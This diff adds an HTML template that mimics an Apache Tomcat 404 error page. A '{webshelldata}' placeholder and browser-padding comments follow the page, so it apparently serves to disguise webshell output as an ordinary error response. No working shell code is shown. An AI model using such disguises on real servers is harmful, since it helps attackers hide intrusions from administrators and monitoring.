@@ -1,0 +1,16 @@
+ <!doctype html><html lang="en"><head><title>HTTP Status 404 - Not Found</title><style type="text/css">h1 
+        {xx}font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;{yy} h2 {xx}font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;{yy} h3 {xx}font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;{yy} body {xx}font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;{yy} b {xx}font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;{yy} p {xx}font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;{yy} a {xx}color:black;{yy} a.name {xx}color:black;{yy} .line {xx}height:1px;background-color:#525D76;border:none;{yy}
+        </style>
+        </head>
+        <body>
+        <h1>HTTP Status 404 - Not Found</h1><hr class="line" />
+        <p>
+        <b>Type</b> Status Report</p>
+        <p><b>Message</b> Not found</p><p><b>Description</b> The origin server did not find a current representation for the target resource or is not willing to disclose that one exists.</p><hr class="line" /><h3>Apache Tomcat/9.0.21</h3></body></html>
+{webshelldata}
+<!-- a padding to disable MSIE and Chrome friendly error page -->
+<!-- a padding to disable MSIE and Chrome friendly error page -->
+<!-- a padding to disable MSIE and Chrome friendly error page -->
+<!-- a padding to disable MSIE and Chrome friendly error page -->
+<!-- a padding to disable MSIE and Chrome friendly error page -->
+<!-- a padding to disable MSIE and Chrome friendly error page -->
